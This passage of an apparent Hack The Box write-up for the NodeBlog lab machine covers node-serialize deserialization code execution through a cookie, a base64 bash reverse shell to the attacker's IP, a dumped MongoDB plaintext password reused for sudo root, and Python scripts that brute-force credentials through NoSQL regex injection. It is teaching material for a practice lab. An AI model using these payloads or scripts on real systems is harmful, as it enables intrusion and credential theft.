+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"user"</span><span class="p">:</span><span class="s2">"admin"</span><span class="p">,</span><span class="nl">"sign"</span><span class="p">:</span><span class="s2">"23e112072945418601deb47d9a6c7de8"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>It is worth noting that all the non-letters/digits in the cookie are URL encoded.</p>
+<h4 id="exploit-poc">Exploit POC</h4>
+<p><a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/">This blog post</a> does a nice job writing up the path to exploit node-serialize. The example payload they give is:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"rce"</span><span class="p">:</span><span class="s2">"_$$ND_FUNC$$_function (){require('child_process').exec('ls /',
+function(error, stdout, stderr) { console.log(stdout) });}()"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>The source code makes it clear that this is checked before the <code class="language-plaintext highlighter-rouge">user</code> or <code class="language-plaintext highlighter-rouge">sign</code> fields, so I can just make this my cookie. I’ll start with:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"rce"</span><span class="p">:</span><span class="s2">"_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 1 10.10.14.8', function(error, stdout, stderr){console.log(stdout)});}()"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>This URL encodes to:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%7b%22%72%63%65%22%3a%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%28%29%7b%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%70%69%6e%67%20%2d%63%20%31%20%31%30%2e%31%30%2e%31%34%2e%38%27%2c%20%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%7b%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%7d%29%3b%7d%28%29%22%7d
+</code></pre></div></div>
+<p>It is important to URL encode (I’ll look at why I need to URL encode this in <a href="#bad-characters-in-deserialization-payload">Beyond Root</a>).</p>
+<p>I’ll start <code class="language-plaintext highlighter-rouge">tcpdump</code>, and send this in repeater, which leads to ICMP packets:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-ni</span> tun0 icmp
+<span class="go">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+13:37:28.886060 IP 10.10.11.139 &gt; 10.10.14.8: ICMP echo request, id 1, seq 1, length 64
+13:37:28.886083 IP 10.10.14.8 &gt; 10.10.11.139: ICMP echo reply, id 1, seq 1, length 64
+</span></code></pre></div></div>
+<h4 id="shell">Shell</h4>
+<p>I played with a few things, but ended up getting a base64 encoded bash reverse shell to work. I created it in my own terminal:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.8/443 0&gt;&amp;1'</span> | <span class="nb">base64</span>
+<span class="go">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0MyAwPiYxCg==
+</span></code></pre></div></div>
+<p>Then tested that it worked by running and making sure it connected:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo </span>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0MyAwPiYxCg<span class="o">==</span>|base64 <span class="nt">-d</span>|bash
+</code></pre></div></div>
+<p>Then reset <code class="language-plaintext highlighter-rouge">nc</code> and put the payload into the GET request:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.11.139:5000</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">DNT</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">auth=%7b%22%72%63%65%22%3a%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%28%29%7b%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%65%63%68%6f%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%34%4c%7a%51%30%4d%79%41%77%50%69%59%78%43%67%3d%3d%7c%62%61%73%65%36%34%20%2d%64%7c%62%61%73%68%27%2c%20%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%7b%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%7d%29%3b%7d%28%29%22%7d</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Set-GPC</span><span class="p">:</span> <span class="s">1</span>
+</code></pre></div></div>
+<p>On sending in Repeater, I got a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.10.11.139 38464
+bash: cannot set terminal process group (849): Inappropriate ioctl for device
+bash: no job control in this shell
+To run a command as administrator (user "root"), use "sudo &lt;command&gt;".
+See "man sudo_root" for details.
+
+bash: /home/admin/.bashrc: Permission denied
+</span><span class="gp">admin@nodeblog:/opt/blog$</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll upgrade it using the <code class="language-plaintext highlighter-rouge">script</code> trick:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">admin@nodeblog:/opt/blog$</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">script /dev/null -c bash
+Script started, file is /dev/null
+To run a command as administrator (user "root"), use "sudo &lt;command&gt;".
+See "man sudo_root" for details.
+
+bash: /home/admin/.bashrc: Permission denied
+</span><span class="gp">admin@nodeblog:/opt/blog$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+            reset
+</span><span class="gp">admin@nodeblog:/opt/blog$</span><span class="w">
+</span></code></pre></div></div>
+<h3 id="usertxt">user.txt</h3>
+<p>At least on initial deploy to HTB, the machine went out with strange permissions on <code class="language-plaintext highlighter-rouge">/home/admin</code>. This is first visible when I load the shell and get an error: “bash: /home/admin/.bashrc: Permission denied”.</p>
+<p>The directory is set to 644:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">admin@nodeblog:/home$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 0
+drw-r--r-- 1 admin admin 220 Jan  3 17:16 admin
+</span></code></pre></div></div>
+<p>Without <code class="language-plaintext highlighter-rouge">x</code> on the dir, I can’t go into it. Interestingly, even though <code class="language-plaintext highlighter-rouge">user.txt</code> is readable by admin, I can’t read it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">admin@nodeblog:/home$</span><span class="w"> </span><span class="nb">cat </span>admin/user.txt
+<span class="go">cat: admin/user.txt: Permission denied
+</span></code></pre></div></div>
+<p>But, as admin is the owner of the directory, I can change the permissions, and get the flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">admin@nodeblog:/home$</span><span class="w"> </span><span class="nb">chmod</span> +x admin/
+<span class="gp">admin@nodeblog:/home$</span><span class="w"> </span><span class="nb">cd </span>admin/
+<span class="gp">admin@nodeblog:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">621989e8************************
+</span></code></pre></div></div>
+<p>This may be fixed, but it was an interesting exploration of Linux file permissions.</p>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="general">General</h4>
+<p>There’s nothing else of interest in <code class="language-plaintext highlighter-rouge">/home/admin</code>. <code class="language-plaintext highlighter-rouge">sudo</code> requests a password for the admin user:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">admin@nodeblog:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>     
+<span class="go">[sudo] password for admin: 
+</span></code></pre></div></div>
+<p>Looking at what is running on the host, I’ll see <code class="language-plaintext highlighter-rouge">mongod</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">admin@nodeblog:~$</span><span class="w"> </span>ps auxww
+<span class="go">...[snip]...
+mongodb      693  0.3  1.8 983884 76276 ?        Ssl  Jan10   0:39 /usr/bin/mongod --unixSocketPrefix=/run/mongodb --config /etc/mongodb.conf
+...[snip]...
+</span></code></pre></div></div>
+<p>That config shows it’s listening on the default port of 27017, which is in the <code class="language-plaintext highlighter-rouge">netstat</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">admin@nodeblog:~$</span><span class="w"> </span>netstat <span class="nt">-tnlp</span>
+<span class="go">(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::5000                 :::*                    LISTEN      849/node /opt/blog/ 
+</span></code></pre></div></div>
+<h4 id="mongo">Mongo</h4>
+<p>There’s a few ways to get data from Mongo. <code class="language-plaintext highlighter-rouge">mongo</code> will connect to a local instance with no additional parameters:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">admin@nodeblog:~$</span><span class="w"> </span>mongo
+<span class="go">MongoDB shell version v3.6.8
+connecting to: mongodb://127.0.0.1:27017
+Implicit session: session { "id" : UUID("6c8944d0-e1f8-4ccb-9613-a4bec8925cb1") }
+MongoDB server version: 3.6.8
+Server has startup warnings: 
+2022-01-10T21:09:16.064+0000 I CONTROL  [initandlisten] 
+2022-01-10T21:09:16.064+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
+2022-01-10T21:09:16.064+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
+2022-01-10T21:09:16.064+0000 I CONTROL  [initandlisten] 
+</span><span class="gp">&gt;</span><span class="w"> 
+</span></code></pre></div></div>
+<p>I can show the databases:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;</span><span class="w"> </span><span class="n">show</span> <span class="n">dbs</span>
+<span class="go">admin   0.000GB
+blog    0.000GB
+config  0.000GB
+local   0.000GB
+</span></code></pre></div></div>
+<p>All of those except for <code class="language-plaintext highlighter-rouge">blog</code> are <a href="https://www.mysoftkey.com/mongodb/3-default-database-in-mongodb/">default dbs in Mongo</a>. I’ll look at <code class="language-plaintext highlighter-rouge">blog</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;</span><span class="w"> </span><span class="n">use</span> <span class="n">blog</span>
+<span class="go">switched to db blog
+</span><span class="gp">&gt;</span><span class="w"> </span><span class="n">show</span> <span class="n">collections</span>
+<span class="go">articles
+users
+</span></code></pre></div></div>
+<p>Two collections, the <code class="language-plaintext highlighter-rouge">users</code> obviously of more interest as it could contain auth information. In fact, it has the plaintext password for admin:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;</span><span class="w"> </span><span class="n">db</span><span class="p">.</span><span class="n">users</span><span class="p">.</span><span class="nf">find</span><span class="p">()</span>
+<span class="go">{ "_id" : ObjectId("61b7380ae5814df6030d2373"), "createdAt" : ISODate("2021-12-13T12:09:46.009Z"), "username" : "admin", "password" : "IppsecSaysPleaseSubscribe", "__v" : 0 }
+</span></code></pre></div></div>
+<p>Another way to get to this same information would be with <code class="language-plaintext highlighter-rouge">mongodump</code>. From an empty directory, I’ll run it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">admin@nodeblog:/dev/shm$</span><span class="w"> </span>mongodump 
+<span class="go">2022-01-11T00:41:49.300+0000    writing admin.system.version to 
+2022-01-11T00:41:49.301+0000    done dumping admin.system.version (1 document)
+2022-01-11T00:41:49.301+0000    writing blog.articles to 
+2022-01-11T00:41:49.301+0000    writing blog.users to 
+2022-01-11T00:41:49.301+0000    done dumping blog.articles (2 documents)
+2022-01-11T00:41:49.301+0000    done dumping blog.users (1 document)
+</span></code></pre></div></div>
+<p>All the data was written to files in <code class="language-plaintext highlighter-rouge">dump</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">admin@nodeblog:/dev/shm$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">dump  multipath
+</span><span class="gp">admin@nodeblog:/dev/shm$</span><span class="w"> </span><span class="nb">ls </span>dump/
+<span class="go">admin  blog
+</span></code></pre></div></div>
+<p>There are four files in <code class="language-plaintext highlighter-rouge">blog</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">admin@nodeblog:/dev/shm$</span><span class="w"> </span><span class="nb">ls </span>dump/blog/
+<span class="go">articles.bson  articles.metadata.json  users.bson  users.metadata.json
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">metadata.json</code> files aren’t interesting. And the <code class="language-plaintext highlighter-rouge">.bson</code> files are binary:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">admin@nodeblog:/dev/shm$</span><span class="w"> </span>xxd dump/blog/users.bson 
+<span class="go">00000000: 6e00 0000 075f 6964 0061 b738 0ae5 814d  n...._id.a.8...M
+00000010: f603 0d23 7309 6372 6561 7465 6441 7400  ...#s.createdAt.
+00000020: 19e7 b2b3 7d01 0000 0275 7365 726e 616d  ....}....usernam
+00000030: 6500 0600 0000 6164 6d69 6e00 0270 6173  e.....admin..pas
+00000040: 7377 6f72 6400 1a00 0000 4970 7073 6563  sword.....Ippsec
+00000050: 5361 7973 506c 6561 7365 5375 6273 6372  SaysPleaseSubscr
+00000060: 6962 6500 105f 5f76 0000 0000 0000       ibe..__v......
+</span></code></pre></div></div>
+<p>While I can get the password out of that, <code class="language-plaintext highlighter-rouge">bsondump</code> will make it nice to read:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">admin@nodeblog:/dev/shm$</span><span class="w"> </span>bsondump dump/blog/users.bson
+<span class="gp">{"_id":{"$</span>oid<span class="s2">":"</span>61b7380ae5814df6030d2373<span class="s2">"},"</span>createdAt<span class="s2">":{"</span><span class="nv">$date</span><span class="s2">":"</span>2021-12-13T12:09:46.009Z<span class="s2">"},"</span>username<span class="s2">":"</span>admin<span class="s2">","</span>password<span class="s2">":"</span>IppsecSaysPleaseSubscribe<span class="s2">","</span>__v<span class="s2">":0}
+</span><span class="go">2022-01-11T00:43:37.566+0000    1 objects found
+</span></code></pre></div></div>
+<h3 id="sudo-su">sudo su</h3>
+<p>It turns out that admin reuses their password between the website and the host, as it works when <code class="language-plaintext highlighter-rouge">sudo</code> prompts:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">admin@nodeblog:/dev/shm$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">[sudo] password for admin: 
+Matching Defaults entries for admin on nodeblog:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User admin may run the following commands on nodeblog:
+    (ALL) ALL
+    (ALL : ALL) ALL
+</span></code></pre></div></div>
+<p>And, admin can run anything as root. <code class="language-plaintext highlighter-rouge">sudo su</code> will return a root shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">admin@nodeblog:/dev/shm$</span><span class="w"> </span><span class="nb">sudo </span>su
+<span class="go">root@nodeblog:/dev/shm#
+</span></code></pre></div></div>
+<p>And I can read <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@nodeblog:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">8c01d129************************
+</span></code></pre></div></div>
+<h2 id="beyond-root">Beyond Root</h2>
+<h3 id="bad-characters-in-deserialization-payload">Bad Characters in Deserialization Payload</h3>
+<p>For the deserialization payload, when I used ctrl-u to “encode key characters” in Burp, the payload didn’t work. When I encoded all the characters, it did. I wanted to figure out what was breaking it. I’ll explore a bit in <a href="https://www.youtube.com/watch?v=MT3wwqIAU1c">this video</a>:</p>
+<iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" height="315" src="https://www.youtube.com/embed/MT3wwqIAU1c" style="border: 0px;" title="YouTube video player" width="560"></iframe>
+<p>The answer is two things. With no encoding, it breaks because of the <code class="language-plaintext highlighter-rouge">;</code>. That signifies the end of the cookie in HTTP, and thus breaks things. So when I ctrl-u, that is fixed. But ctrl-u also replaces spaces with <code class="language-plaintext highlighter-rouge">+</code>, which seems to break this application as well. On replacing those with either spaces or <code class="language-plaintext highlighter-rouge">%20</code>, the payload works fine.</p>
+<p>Moral of the story - pay attention to the encoding.</p>
+<h3 id="nosql-data-collection">NoSQL Data Collection</h3>
+<p>I was able to use the NoSQL injection to bypass auth on the login form. I could also use that to enumerate at least the fields used in the query. I started with a script that would give me all the accounts on the box.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">string</span>
+
+
+<span class="k">def</span> <span class="nf">brute_username</span><span class="p">(</span><span class="n">user</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="se">\r</span><span class="si">{</span><span class="n">user</span><span class="si">}{</span><span class="n">c</span><span class="si">:</span><span class="o">&lt;</span><span class="mi">50</span><span class="si">}</span><span class="sh">'</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span> <span class="sh">'</span><span class="s">user</span><span class="sh">'</span><span class="p">:</span>
+                       <span class="p">{</span> <span class="sh">'</span><span class="s">$regex</span><span class="sh">'</span> <span class="p">:</span> <span class="sa">f</span><span class="sh">'</span><span class="s">^</span><span class="si">{</span><span class="n">user</span><span class="si">}{</span><span class="n">c</span><span class="si">}</span><span class="sh">'</span> <span class="p">},</span>
+                    <span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">0xdf</span><span class="sh">'</span>
+                  <span class="p">}</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sh">'</span><span class="s">http://10.10.11.139:5000/login</span><span class="sh">'</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="sh">'</span><span class="s">Invalid Password</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span><span class="p">:</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">user</span><span class="si">}{</span><span class="n">c</span><span class="si">}</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">0xdf</span><span class="sh">'</span><span class="p">}</span>
+            <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sh">'</span><span class="s">http://10.10.11.139:5000/login</span><span class="sh">'</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+            <span class="k">if</span> <span class="sh">'</span><span class="s">Invalid Password</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="se">\r</span><span class="si">{</span><span class="n">user</span><span class="si">}{</span><span class="n">c</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+            <span class="nf">brute_username</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">user</span><span class="si">}{</span><span class="n">c</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+
+
+<span class="nf">brute_username</span><span class="p">(</span><span class="sh">''</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="se">\r</span><span class="sh">'</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
+</code></pre></div></div>
+<p>It is a recursive function that tries the current string plus one new character and uses regex search to see if there’s a user that starts with that pattern. If there is, it checks if that new string is a valid user, and if so, prints it. It then continues checking for next characters either way. That’s important to catch if there’s both admin and administrator, for example.</p>
+<p>It turns out there’s only one user, admin:</p>
+<p><img alt="" src="https://0xdfimages.gitlab.io/img/nodeblog-brute-users.gif"/></p>
+<p>I’ll write another quick script that will take a username and get the password. I originally skipped past this assuming that the password would be a hash I didn’t need yet. Only later did I find that it was a cleartext password that I needed to solve the box.</p>
+<p>This time I know there’s only one valid password for the given user, so I can use a simple <code class="language-plaintext highlighter-rouge">while</code> loop until I find it:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">string</span>
+<span class="kn">import</span> <span class="n">sys</span>
+
+
+<span class="n">user</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">password</span> <span class="o">=</span> <span class="sh">''</span>
+<span class="n">found</span> <span class="o">=</span> <span class="bp">False</span>
+
+<span class="k">while</span> <span class="ow">not</span> <span class="n">found</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="sh">'</span><span class="s">!@#$%^&amp;,</span><span class="sh">'</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="se">\r</span><span class="si">{</span><span class="n">password</span><span class="si">}{</span><span class="n">c</span><span class="si">:</span><span class="o">&lt;</span><span class="mi">50</span><span class="si">}</span><span class="sh">'</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span> <span class="sh">'</span><span class="s">user</span><span class="sh">'</span><span class="p">:</span> <span class="n">user</span><span class="p">,</span>
+                    <span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">:</span>
+                       <span class="p">{</span> <span class="sh">'</span><span class="s">$regex</span><span class="sh">'</span> <span class="p">:</span> <span class="sa">f</span><span class="sh">'</span><span class="s">^</span><span class="si">{</span><span class="n">password</span><span class="si">}{</span><span class="n">c</span><span class="si">}</span><span class="sh">'</span> <span class="p">},</span>
+                  <span class="p">}</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sh">'</span><span class="s">http://10.10.11.139:5000/login</span><span class="sh">'</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="ow">not</span> <span class="sh">'</span><span class="s">Invalid Password</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span><span class="p">:</span> <span class="n">user</span><span class="p">,</span> <span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">:</span> <span class="n">password</span> <span class="o">+</span> <span class="n">c</span><span class="p">}</span>
+            <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sh">'</span><span class="s">http://10.10.11.139:5000/login</span><span class="sh">'</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+            <span class="n">password</span> <span class="o">+=</span> <span class="n">c</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="sh">'</span><span class="s">Invalid Password</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="se">\r</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+                <span class="n">found</span> <span class="o">=</span> <span class="bp">True</span>
+            <span class="k">break</span>
+</code></pre></div></div>
+<p>It finds the password pretty quickly:</p>
+<p><img alt="" src="https://0xdfimages.gitlab.io/img/nodeblog-brute-password.gif"/></p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2022/01/10/htb-nodeblog.html"></a>
+</article>
